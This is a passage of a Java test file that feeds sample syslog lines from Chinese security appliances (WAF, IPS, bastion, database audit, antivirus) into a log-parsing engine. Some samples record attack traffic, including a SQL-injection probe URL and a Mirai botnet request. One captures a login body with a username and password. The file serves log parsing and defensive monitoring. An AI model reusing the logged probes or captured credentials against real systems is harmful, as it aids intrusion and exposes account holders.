      data = "<389>Jan 28 15:32:31 ips CONFIG: SerialNum=0113251411269999 GenTime=\"2016-01-28 15:32:31\" SrcIP=192.168.13.217 SrcIP6= SrcIPVer=4 UserName=admin Operate=\"add fw_policy_table configuration\" ManageStyle=WEB Content=\"operation success\" EvtCount=1";
      parse(botuEngine, data);
      data = "<334>Sep 26 09:49:49 ips DHCP: SerialNum=0113211411269999 GenTime=\"2016-09-26 09:49:49\" Content=\"Start dhcp server on interface[ge0/4]\" EvtCount=1";
      parse(botuEngine, data);
      data = "<538>May 13 19:24:00 ips APT: SerialNum=0113301405099999 GenTime=\"2014-05-13 19:24:00\" SrcIP=172.16.2.219 SrcIP6= SrcIPVer=4 DstIP=172.16.2.220 DstIP6= DstIPVer=4 SampleName=\"zip.000\" SampleParent=\"test.zip\" SrcArea=Unknown DstArea=Unknown DetectMethod=隐藏PE SampleTimeint=2014-05-13 19:24:00 SampleMD5=1dd20aad5b486e26719750722d19c68d SampleSrc=1 FileType=pdf ProtocolType=HTTP SensorResultLevel=恶意 SensorSTime=\"2014-05-13 19:24:00\" SensorFTime=\"2014-05-13 19:24:00\" Sender=\"\" Recipient=\"\" EmailTitle=\"\" RequestDomain=\"172.16.2.220:8080\" RequestResource=\"/tmw/8/mailmain?type=commonsfileupload&sessionid=e151c2H6_0\" ServerName=\"\" UserName=\"\" SampleFilePath=\"/hdisk/aptexport/2014-05-13/2/1dd20aad5b486e26719750722d19c68d_1400009040388014.000\" FtpDirect=\"\" DetailReport=\"91 80 4c da df DA dc da d8 da DC da 23 25 dc DA 64 da dc da\" Description=\"\" EvtCount=1";
      parse(botuEngine, data);
      data = "<546>Dec 25 18:52:11 ips CCTUNNEL: SerialNum=0113301403029999 GenTime=\"2014-12-25 18:52:11\" MasterIP= MasterIP6=fde0:6477:1e3f:0000:0000:0000:0002:0011 MasterIPVer=6 SlaveIP= SlaveIP6=fde0:6477:1e3f:0000:0000:0000:0001:d81e SlaveIPVer=6 MasterPort=16906 SlavePort=34350 DangerLevel=高 EventName=发现控制行为 ConnSTime=2014-12-25 18:52:11 ConnPTime=8 TypicalAction=流量比异常 EvtCount=1";
      parse(botuEngine, data);
      data = "<573>Jan 14 14:18:58 ips APT_CB_BLOCK: SerialNum=0113231509229999 GenTime=\"2016-01-14 14:18:58\" SrcIP=192.168.38.31 SrcIP6= SrcIPVer=4 DstIP=192.168.38.32 DstIP6= DstIPVer=4 SrcPort=1064 DstPort=21 TimeInt=1452781138 Type=1 Content=\"block Apt callback,IP=192.168.38.32,callback name=for_test,extract from file=add-by-user[MD5=]\"";
      parse(botuEngine, data);
      data = "<565>Oct  9 15:33:19 ips PSM: SerialNum=0113331411269999 GenTime=\"2015-10-09 15:33:19\" SrcIP=192.168.13.154 SrcIP6= SrcIPVer=4 DstIP=163.177.68.178 DstIP6= DstIPVer=4 Protocol=HTTP SrcPort=12345 DstPort=80 InInterface=ge0/1 OutInterface=ge0/2 FwPolicyID=6 EventLevel=5 EventType=PSM AppType=网页应用 Template=购物网站 Item=jd Subject= Sender= Recipient= Action=Allow Url=http://v.gdt.qq.com/gdt_stats.fcg?stkey=1A45F06AAF1C3E6881F6DA86687493E829EA4EB6645A5FEFCCD4932DB0CCAE380DD8E328ED4FB2435A08B05D34F62A2628076C780C53C4A3152D5542A0F446DE01FAEF7F0A46A8D007C2758E423BC2 CaptureFile=/doc/psm_cap/http/2584586432_14640_2990846371_20480_6.cap Content=\"匹配位置[正文] \" EvtCount=1";
      parse(botuEngine, data);
      data = "<553>Oct  9 14:47:02 ips WEBSCAN: SerialNum=0113321411269999 GenTime=\"2015-10-09 14:47:02\" SrcIP=172.16.2.172 SrcIP6= SrcIPVer=4 DstIP=172.16.2.183 DstIP6= DstIPVer=4 Protocol=HTTP SrcPort=14261 DstPort=80 ServerIP=172.16.2.183 FwPolicyID=1 EventName=Web恶意扫描 EventLevel=1 Action=0 DetectLevel=3 PktNum=1800 Content=\"网络爬虫(持续爬取)\" EvtCount=1";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testBastionShenFanSagSyslog() {
    String parserFile = "./resources/parsers/bastion_shenfan_sag_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<33>Nov 11 13:58:41 fort baoleiji: <AUDIT_LOG>[OA用户](通过账号[OA]登录在[2020-11-11 13:58:30]到[2020-11-11 13:58:40]通过[10.10.98.10]访问[10.2.1.10],用[$user]账号通过[ssh2]协议访问[OA1](资源类型[Common linux])。日志级别:[INFO]";
      parse(botuEngine, data);
      data = "<33>Nov 11 13:57:58 fort baoleiji: 安全保密管理员(通过账号secAdmin登录)，在2020-11-11 13:57:57通过10.10.98.10做添加【测试windows(192.168.1.30)】操作，操作成功。日志级别：[INFO]。";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testEpsNsfocusEssSyslog() {
    String parserFile = "./resources/parsers/eps_nsfocus_ess[v9.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "{\"type\":1,\"content\":{\"scid\":\"1308252377\",\"IP\":\"100.100.101.21\",\"id\":\"2922157731\",\"SubVirusType\":\"2001\",\"sessionid\":\"2227389213\",\"ComputerName\":\"DCN-PC\",\"VirusProcessResult\":\"1\",\"hosttype\":\"1\",\"MD5\":\"45204D5EF88E748AA5D0A4BEAA87F1B9\",\"InfectedFileName\":\"C:\\/Users\\/lenovo\\/Desktop\\/防病毒测试\\/测试样本.zip\\/<a:Zip>\\/测试样本\\/00d423cb57d68bf37da5ad9b3950f533e311dc7d\",\"scremark\":\"\",\"InfectedTime\":\"1678155500\",\"ScanType\":\"2\",\"VirusName\":\"Win32.Heur.KVM007.a\",\"scname\":\"WIN-925BDE3IC2P\",\"scip\":\"100.100.102.23$10.10.10.214$169.\",\"rowid\":\"375\",\"ActionWhenFindVirus\":\"3\",\"VirusType\":\"感染型病毒\",\"Domain\":\"WORKGROUP\"},\"version\":1.4,\"sendtime\":1678155532}";
      parse(botuEngine, data);
      data = "[2023-02-03 17:08:58 INFO]  job_syslog.lua:211: {\"type\":3,\"content\":{\"scid\":\"41176733\",\"virus_version\":\"2023.2.1.5\",\"ucclient\":\"7\",\"sccount\":\"5\",\"usclient\":\"1\",\"usccount\":\"2\",\"endtime\":\"2024-07-10 00:00:00\",\"guid\":\"32DFCDE2-95E5-BED0-2BDB-19A41462399C\",\"parentid\":\"00000000-0000-0000-0000-000000000000\",\"begintime\":\"2017-01-01 00:00:00\",\"ip\":\"127.0.0.1\",\"cclient\":\"150\",\"level\":\"0\",\"scname\":\"WIN-OP\",\"scremark\":\"\",\"sclient\":\"20\"},\"version\":1.1,\"sendtime\":1675415338}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testWafVenusWagSyslog() {
    String parserFile = "./resources/parsers/waf_venus_wag_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<902>Aug 13 10:28:34 host WAG: SerialNum=0123211903279999 GenTime=\"2019-08-13 10:28:34\" Module=HTTP_sogou_spider_爬取网页 SrcIP=106.120.173.66 DstIP=10.1.7.16 SrcPort=43445 DstPort=80 In=ge0/3 Out=ge0/2 Action=pass URL=\"www.tobacco.gov.cn/html/58/5802/580201/4949115_n.html\" Content=\"Method=GET;Host=www.tobacco.gov.cn;URL长度=35;User_Agent=Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07);Http协议头长度=248;URL=/html/58/5802/580201/4949115_n.html;访问文件=4949115_n.html;MsgbodyData=;\" EvtCount=1 Evt_level=10 Evt_type=网页爬虫 Evt_log_level=6 Host=www.tobacco.gov.cn Evt_response=0 BeforeNat= Method=GET";
      parse(botuEngine, data);
      data = "<782>Aug 13 10:28:33 host WAG: SerialNum=0123211903279999 GenTime=\"2019-08-13 10:28:33\" Module=全局访问控制白名单 SrcIP=10.1.0.70 DstIP=10.1.7.37 SrcPort=49140 DstPort=80 In=ge0/3 Out= Action=pass Content=\"全局访问控制:  白名单:(访问邮件全通);\" EvtCount=1 Evt_level=30 Evt_type=安全审计 Evt_log_level=6 Host= Evt_response=0 BeforeNat= Method=";
      parse(botuEngine, data);
      data = "<902>Aug 13 10:27:13 host WAG: SerialNum=0123211903279999 GenTime=\"2019-08-13 10:27:13\" Module=HTTP_认证请求 SrcIP=10.67.162.133 DstIP=10.1.7.58 SrcPort=52085 DstPort=80 In=ge0/3 Out=ge0/2 Action=pass URL=\"zj.tobacco.gov.cn/rone/login\" Content=\"用户名称=;URL=/rone/login;HOST=zj.tobacco.gov.cn;Body_Data=j_username=10411701002&j_password=%E6%96%B0%E5%8F%91%E5%8D%A1&userName=10411701002&password=%E6%96%B0%E5%8F%91%E5%8D%A1&userid=100623&sysId=4&linkpage=;\" EvtCount=1 Evt_level=10 Evt_type=其他事件 Evt_log_level=6 Host=zj.tobacco.gov.cn Evt_response=0 BeforeNat= Method=POST";
      parse(botuEngine, data);
      data = "<902>Aug 13 10:26:49 host WAG: SerialNum=0123211903279999 GenTime=\"2019-08-13 10:26:49\" Module=HTTP_Wget工具_远程访问 SrcIP=220.243.135.42 DstIP=10.1.7.34 SrcPort=31576 DstPort=80 In=ge0/3 Out=ge0/2 Action=pass URL=\"images.echinatobacco.com/templates/100001/gyzw/contentcss.css\" Content=\"Host=images.echinatobacco.com;URL=/templates/100001/gyzw/contentcss.css;URL长度=37;Http协议头长度=0;User-Agent=Wget/1.17.1 (linux-gnu);\" EvtCount=1 Evt_level=10 Evt_type=网页爬虫 Evt_log_level=6 Host=images.echinatobacco.com Evt_response=0 BeforeNat= Method=GET";
      parse(botuEngine, data);
      data = "<533>Aug 13 10:25:03 host SYSTEM_NOTICE: SerialNum=0123211903279999 GenTime=\"2019-08-13 10:25:03\" SrcIP= DstIP= Content=\"Change state, from softbypass to normal, Average-CpuUsage=12% MemoryUsage=26% \" EvtCount=1";
      parse(botuEngine, data);
      data = "<389>Aug 13 10:24:22 host CONFIG: SerialNum=0123211903279999 GenTime=\"2019-08-13 10:24:22\" SrcIP= DstIP= WAG日志接近上限 5242880 Bytes EvtCount=1";
      parse(botuEngine, data);
      data = "<902>Aug 13 10:24:06 host WAG: SerialNum=0123211903279999 GenTime=\"2019-08-13 10:24:06\" Module=HTTP_robots.txt_访问 SrcIP=172.16.1.241 DstIP=10.1.7.16 SrcPort=2517 DstPort=80 In=ge0/3 Out=ge0/2 Action=pass URL=\"www.tobacco.gov.cn/robots.txt\" Content=\"Method=GET;Host=www.tobacco.gov.cn;URL长度=11;Http协议头长度=199;URL=/robots.txt;访问文件=robots.txt;MsgbodyData=;\" EvtCount=1 Evt_level=10 Evt_type=敏感文件访问 Evt_log_level=6 Host=www.tobacco.gov.cn Evt_response=0 BeforeNat= Method=GET";
      parse(botuEngine, data);
      data = "<358>Aug 13 10:23:33 host RUN_INFO: SerialNum=0123211903279999 GenTime=\"2019-08-13 10:23:33\" SrcIP= DstIP=  CpuUsage=9.94   MemoryUsage=25.39 SessionNum=3977 HalfSessionNum=267  Eth1Band=2000000 Eth2Band=0 Eth3Band=0 Eth4Band=0 Sysbps=6762 Content=\"operation success\" EvtCount=1";
      parse(botuEngine, data);
      data = "<900>Aug 13 10:23:23 host WAG: SerialNum=0123211903279999 GenTime=\"2019-08-13 10:23:23\" Module=HTTP_僵尸网络_MiraiXMiner_连接 SrcIP=218.70.86.154 DstIP=10.1.7.16 SrcPort=36159 DstPort=80 In=ge0/3 Out=ge0/2 Action=drop URL=\"www.tobacco.gov.cn/kill.txt\" Content=\"host=www.tobacco.gov.cn;URL=/kill.txt;Method=GET;\" EvtCount=1 Evt_level=30 Evt_type=木马攻击 Evt_log_level=4 Host=www.tobacco.gov.cn Evt_response=0 BeforeNat= Method=GET";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testDbauditVenusTianyueSyslog() {
    String parserFile = "./resources/parsers/audit_venus_tianyue[6.0.16.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Sep 10 16:06:37 192.168.11.35 JUL 14 16:03:22 test ORACLE: devsn=2616241412129999 gen_time=2020-07-13 16:03:22 id=2546193346741668176 session_id=2546193346741665984 transport_protocol=tcp app_protocol=ORACLE level=urgent dev_ip=192.168.11.35 server_ip=10.200.205.61 client_ip=192.168.3.1 server_port=1521 redirect_port=1521 client_port=53927 server_mac=6C-AE-8B-38-8D-92 client_mac=50-3D-E5-0E-D8-BF ruleset_name=ANY rule_name=ANY bizaccout=caih auth_account= policy_id=1 rule_id=11 rule_templet_id=36000 direction=response response_time=245 error_code=0 block=no record_rows=0 sql=begin sys.dbms_application_info.set_module('PL/SQL Developer', 'Primary Session'); end; client_host=CAIH-PC server_host=10.200.205.61 library=ODBC client_software=plsqldev.exe client_user=caih instance_name= db_name=pmes table_name= object_name=sys.dbms_application_info.set_module cmd=1302 subcmd=";
      parse(botuEngine, data);
      data = "Sep 10 16:20:55 192.168.11.35 Jul 9 16:17:40 test FTP: devsn=2616241412129999 gen_time=2020-07-13 16:17:40 id=2546193361153300000 session_id=2546193361153294784 transport_protocol=tcp app_protocol=FTP level=urgent dev_ip=192.168.11.35 server_ip=192.168.42.218 client_ip=192.168.29.167 server_port=21 redirect_port=21 client_port=3526 server_mac=00-17-DF-BA-4C-00 client_mac=00-16-D3-21-28-A7 ruleset_name=ANY rule_name=ANY bizaccout=test auth_account= policy_id=2 rule_id=3 rule_templet_id=11000 direction=response response_time=286 error_code=150 block=no command=write type=file raw_cmd=STOR src_object=123.txt dst_object= mount_point= local_path=";
      parse(botuEngine, data);
      data = "Sep 10 16:36:04 192.168.11.35 JUL 9 16:32:48 test HTTP: devsn=2616241412129999 gen_time=2020-07-16 16:32:48 id=2546193376387012592 session_id=2546193376387006960 transport_protocol=tcp app_protocol=HTTP level=high dev_ip=192.168.11.35 server_ip=60.28.22.68 client_ip=192.168.27.107 server_port=80 redirect_port=80 client_port=4628 server_mac=00-17-DF-BA-4C-00 client_mac=00-1A-4B-39-5E-E5 ruleset_name=ANY rule_name=ANY bizaccout= auth_account= policy_id=4 rule_id=1 rule_templet_id=9000 direction=response response_time=238 error_code=200 block=no url=http://gimg.baidu.com/img/gs.gif host=gimg.baidu.com referer=http://www.baidu.com/ method=GET cookie=BAIDUID=4426868377F34EA6AE6E616DB420C8FD ddd=ddd post= content= req_content_type= res_content_type=image/gif";
      parse(botuEngine, data);
      data = "Jul 9 10:10:11 192.168.11.4 Jul 9 10:09:06 11.4 SSH: devsn=0612610801000000 gen_time=2020-07-13 18:57:40 id=13371039694159277824 session_id=13371039583847816448 transport_protocol=tcp app_protocol=SSH level=high dev_ip=192.168.11.152 server_ip=192.168.11.135 client_ip=192.168.11.156 server_port=22 redirect_port=22 client_port=54040 server_mac=00-0C-29-87-50-DE client_mac=A0-B3-CC-F7-58-72 ruleset_name=ANY rule_name=ANY bizaccout=root auth_account= policy_id=9 rule_id=25 rule_templet_id=54000 direction=request response_time=0 error_code=0 block=no input_cmd=ls input_data=-al";
      parse(botuEngine, data);
      data = "Oct 08 16:01:15 172.18.30.50 OCT 8 16:01:12 Audit MYSQL: {\"devsn\":\"0666331412129999\", \"gen_time\":\"2022-10-08 16:01:12\",\"id\":\"99995283765050512\",\"session_id\":\"9999528377080435 2\",\"transport_protocol\":\"tcp\",\"app_protocol\":\"MYSQL\",\"level\":\"low\",\"dev_ip\":\"127.0.0.1\",\"server_ip\":\"172.16.107.117\",\"client_ip\":\"10.51.3.2\",\"server_port\":3306,\"redirect_port\":3306,\"client_port\":49897,\"server_mac\":\"7C-1C-F1-A8-C4-B4\",\"client_mac\":\"00-90-FB-50-28-25\",\"ruleset_name\":\"ANY\",\"rule_name\":\"ANY\",\"bizaccout\":\"\",\"auth_account\":\"\",\"policy_id\":\"1\",\"rule_id\":\"19\",\"rule_templet_id\":\"48000\",\"direction\":\"request\",\"response_time\":\"0\",\"error_code\":\"0\",\"block\":\"yes\",\"record_rows\":\"0\",\"sd_label\":\"0\",\"sql\":\"SETPROFILING=1\",\"client_host\":\"\",\"server_host\":\"\",\"library\":\"\",\"client_software\":\"\",\"client_user\":\"\",\"instance_name\":\"\",\"db_name\":\"\",\"table_name\":\"\",\"object_name\":\"\",\"cmd\":\"1301\",\"subcmd\":\"\",\"field\":[]}";
      parse(botuEngine, data);
      data = "Oct 09 13:28:49 172.18.30.137 OCT 9 13:28:46 Audit SQLSERVER: {\"devsn\": \"2666282210081570\", \"gen_time\": \"2022-10-09 13:28:46\", \"id\": \"99996094339051313\",  \"sessionn_id\":\"99996093466544081\",\"transport_protocol\":\"tcp\",\"app_protocol\":\"SQL-SERVER\",\"level\":\"low\",\"dev_ip\":\"127.0.0.1\",\"server_ip\":\"222.15.110.21\",\"client_ip\":\"222.15.110.22\",\"server_port\":1433,\"redirect_port\":1433,\"client_port\":4096,\"server_mac\":\"00-E0-81-33-73-1D\",\"client_mac\":\"00-E0-81-33-99-3E\",\"ruleset_name\":\"ANY\",\"rule_name\":\"ANY\",\"bizaccout\":\"\",\"auth_account\":\"\",\"policy_id\":\"2\",\"rule_id\":\"10\",\"rule_templet_id\":\"35000\",\"direction\":\"response\",\"response_time\":\"0\",\"error_code\":\"0\",\"block\":\"no\",\"record_rows\":\"0\",\"sd_label\":\"0\",\"sql\":\"\",\"client_host\":\"\",\"server_host\":\"\",\"library\":\"\",\"client_software\":\"\",\"client_user\":\"\",\"instance_name\":\"\",\"db_name\":\"\",\"schema_name\":\"\",\"table_name\":\"\",\"cmd\":\"4294967293\",\"object_name\":\"\",\"subcmd\":\"\",\"field\":[]}";
      parse(botuEngine, data);
      data = "Oct 09 19:35:07 172.18.30.43 OCT 10 03:27:39 Audit TELNET: {\"devsn\": \"0666511412129999\", \"gen_time\":\"2022-10-10 03:27:39\",\"id\":\"99997424335467777\",\"session_id \":\"999974243209980 81\",\"transport_protocol\":\"tcp\",\"app_protocol\":\"TELNET\",\"level\":\"low\",\"dev_ip\":\"127.0.0.1\",\"server_ip\":\"192.168.27.171\",\"client_ip\":\"192.168.29.145\",\"server_port\":23,\"redirect_port\":23,\"client_port\":4183,\"server_mac\":\"00-17-DF-BA-4C-00\",\"client_mac\":\"00-11-25-D2-78-08\",\"ruleset_name\":\"ANY\",\"rule_name\":\"ANY\",\"bizaccout\":\"\",\"auth_account\":\"\",\"policy_id\":\"26\",\"rule_id\":\"2\",\"rule_templet_id\":\"10000\",\"direction\":\"request\",\"response_time\":\"0\",\"error_code\":\"0\",\"block\":\"no\",\"input_cmd\":\"venus\",\"input_data\":\"\"}";
      parse(botuEngine, data);
      data = "Mar 19 10:10:11 192.168.11.4 MAR 19 10:09:06 Audit SSH: {\"devsn\": \"0612610801000000\", \"gen_time\":\"2013-07-30 18:57:40\",\"id\":\"13371039694159277824\",\"session_id\":\"1337103958384 7816448\",\"transport_protocol\":\"tcp\",\"app_protocol\":\"SSH\",\"level\":\"high\",\"dev_ip\"=\"192.168.11.152\",\"server_ip\":\"192.168.11.135\",\"client_ip\":\"192.168.11.156\",\"server_port\":22,\"redirect_port\":22,\"client_port\":54040,\"server_mac\":\"00-0C-29-87-50-DE\",\"client_mac\":\"A0-B3-CC-F7-58-72\",\"ruleset_name\":\"ANY\",\"rule_name\":\"ANY\",\"bizaccout\":\"root\",\"auth_account\":\"\",\"policy_id\":\"9\",\"rule_id\":\"25\",\"rule_templet_id\":\"54000\",\"direction\":\"request\",\"response_time\":\"0\",\"error_code\":\"0\",\"block\":\"no\",\"input_cmd\":\"ls\",\"input_data\":\"-al\"}";
      parse(botuEngine, data);
      data = "Oct 09 19:32:00 172.18.30.43 OCT 10 03:24:31 Audit RADIUS: {\"devsn\": \"0666511412129999\", \"gen_time\":\"2022-10-10 03:24:31\",\"id\":\"99997421177287056\",\"session_id\":\"99997384741763744\",\"transport_protocol\":\"udp\",\"app_protocol\":\"RADIUS\",\"level\":\"low\",\"dev_ip\":\"127.0.0.1\",\"server_ip\":\"192.168.6.59\",\"client_ip\":\"192.168.6.60\",\"server_port\":1812,\"redirect_port\":1812,\"client_port\":1035,\"server_mac\":\"00-30-48-5A-00-CC\",\"client_mac\":\"00-0C-29-1E-41-F3\",\"ruleset_name\":\"ANY\",\"rule_name\":\"ANY\",\"bizaccout\":\"abc\",\"auth_account\":\"\",\"policy_id\":\"22\",\"rule_id\":\"18\",\"rule_templet_id\":\"46000\",\"direction\":\"request\",\"response_time\":\"161\",\"error_code\":\"1\",\"block\":\"no\",\"user_ip\":\"ff010203\",\"user_mac\":\"62-50-14-00-00-00\",\"nas_identifier\":\"\",\"acct_status_type\":\"0\"}";
      parse(botuEngine, data);
      data = "<1164>MAY 14 10:57:06 Audit OPCUA: {\"devsn\": \"2644422005081270\", \"gen_time\": \"2020-05-14 10:57:06\", \"id\": \"5575100867897516112\", \"session_id\":\"5575100867897647984\",\"transport_protocol\":\"tcp\",\"app_protocol\":\"OPCUA\",\"level\":\"middle\",\"dev_ip\":\"172.18.30.77\",\"server_ip\":\"10.50.10.18\",\"client_ip\":\"10.50.10.12\",\"server_port\":4840,\"redirect_port\":4840,\"client_port\":4840,\"server_mac\":\"44-8A-5B-AB-0A-4E\",\"client_mac\":\"44-37-E6-77-A3-9B\",\"ruleset_name\":\"ANY\",\"rule_name\":\"ANY\",\"bizaccout\":\"\",\"auth_account\":\"\",\"policy_id\":\"105\",\"rule_id\":\"46\",\"rule_templet_id\":\"80000\",\"direction\":\"response\",\"response_time\":\"249\",\"error_code\":\"0\",\"block\":\"no\",\"func\":\"446\",\"msg_size\":\"269\",\"row_count\":\"0\",\"file_name\":\"\",\"data\":\"{\\\"ServerProtocolVersion\\\":0}\"}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testDpiTopsecTopNTASyslog() {
    String parserFile = "./resources/parsers/dpi_topsec_topnta_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<14>Sep  3 17:43:33 localhost.localdomain tbl_ori_flow_ipv4_realtime;1535966491,46,887509151,3232171005,443,55967,6,0,0,0,0,0,0,11,0,1535966449258,1535966449374,9158069848088837361,0,1,26,0,704275048,10382,0,0,10228,0,0";
      parse(botuEngine, data);
      data = "<12>Sep  3 17:43:29 localhost.localdomain tbl_ori_alert_ipv4_realtime;1535967196251,44,289098541315623,alert,989559095,8000,3232171524,59857,TCP,allowed,1,2210007,1,STREAM 3way handshake SYNACK with wrong ack,非标准协议,1501,2,836690";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testEpsWebrayRayGuardSyslog() {
    String parserFile = "./resources/parsers/eps_webray_rayguard_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<41>2023-02-21T08:07:15Z localhost.localdomain SmartCenter[6410]: traffic 1676966861 6 121.193.76.9 55350 172.217.163.42 443 deny";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testDbAuditDptechDsp1000Syslog() {
    String parserFile = "./resources/parsers/dbaudit_dptech_dsp1000[v3.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "localhost.localdomain: 风险等级: 高$ 源IP : 172.16.1.1$ 源端口: 12345$ 目的IP : 172.16.1.2$ 目的端口: 1521$ 实例名: orcl$ 用户名: zaxy$ 时间: 2019-11-15:17-41-06$ 策略: 全审计策略$ SQL操作: commit";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testDbAuditDptechOsp1000Syslog() {
    String parserFile = "./resources/parsers/bastion_dptech_osp1000[v3.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "[张三]通过账号[zhangsan]在[2015-03-17 17:49:49.0]访问[单点登录]时，触发[命令越权]告警，越权命令：rm。日志级别：[Alert]";
      parse(botuEngine, data);
      data = "[张三]通过账号[zhangsan]在[2015-03-17 17:49:49.0]做[登录]操作时，触发[账号锁定]告警。日志级别：[Alert]";
      parse(botuEngine, data);
      data = "[2015-03-17 17:49:49.0]服务器[192.168.23.17]的[内存]使用率超过最大值[90%]，触发[阈值越界]告警。日志级别：[Alert]";
      parse(botuEngine, data);
      data = "[张三](通过账号[zhangsan]登录)在[2015-03-17 17:49:49.0]到[2015-03-17 17:49:56.0]通过[192.168.23.17]访问[192.168.23.223]，用[root]账号通过[ssh]协议访问[redhat服务器](资源类型[common linux])。日志级别：[INFO]";
      parse(botuEngine, data);
      data = "{auth} Fri Nov 22 16:48:10 GMT+08:00 2019 ALERT fort i: xjy(通过账号xjy登录)，在2019-11-22 16:48:09通过172.16.8.73做添加[1]操作，操作成功。日志级别：[INFO]。 172.16.8.19";
      parse(botuEngine, data);
      data = "{auth} Fri Nov 22 16:23:11 GMT+08:00 2019 ALERT fort i: xjy(通过账号xjy登录)，在2019-11-22 16:23:11通过172.16.8.73做变更[web终端配色]由[]改为[白字黑底]操作，操作成功。日志级别：[INFO]。 172.16.8.19";
      parse(botuEngine, data);
      data = "{auth} Fri Nov 22 16:48:10 GMT+08:00 2019 ALERT fort i: xjy(通过账号xjy登录)，在2019-11-22 16:48:09通过172.16.8.73做删除[1]操作，操作成功。日志级别：[INFO]。 172.16.8.19";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testWafDPtechWaf3000Syslog() {
    String parserFile = "./resources/parsers/waf_dptech_waf3000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "2008-01-01 01:10:31 DPTECH %%WAF/IFMD/5/SYSLOG(l): Interface meth0/0 is up";
      parse(botuEngine, data);
      data = "2016-01-01 01:29:05 DPTECH %% WAF/WEB/3/OPERLOG(l): client-type(84):web;user-name(85):admin;host-ip(86):10.11.0.70;error-code(87):0; User: [admin], IP address: [10.11.0.70] timed out and logged out.";
      parse(botuEngine, data);
      data = "2016-01-01 01:11:41 DPTECH %%WAF/CLI/4/OPERLOG(l): client-type(84):console;user-name(85):**;host-ip(86):**;error-code(87):0;Shutdown interface: [meth0/0].";
      parse(botuEngine, data);
      data = "<96>Jan 15 15:17:47 2020 DPTECH %%WAF/AUDIT/0/SRVLOG(l): log-type:audit;``source-port:46844;``destination-port:88;``pagetype:2;``method:GET;``source-ip:10.101.1.100;``destination-ip:10.101.1.1;``host:10.101.1.1:88;``url:/bWAPP/login.php?a=@@version;``useragent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36;``referer:;``cookies:PHPSESSID=af64ko2eckqf93tr231i95sh2p;``payload:;``httpinfo:GET /bWAPP/login.php?a=@@version HTTP/1.1 Host: 10.101.1.1:88 Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: PHPSESSID=af64ko2eckqf93tr231i95sh2p;``username:;``";
      parse(botuEngine, data);
      data = "<98>Jan 16 09:45:30 2020 DPTECH %%WAF/WEBPAGE-DEFEND/0/SRVLOG(l): event-type:recovery;``url:http://10.101.1.109/Article_List.asp?ID=4674;``time:2020-01-16 09:41:02";
      parse(botuEngine, data);
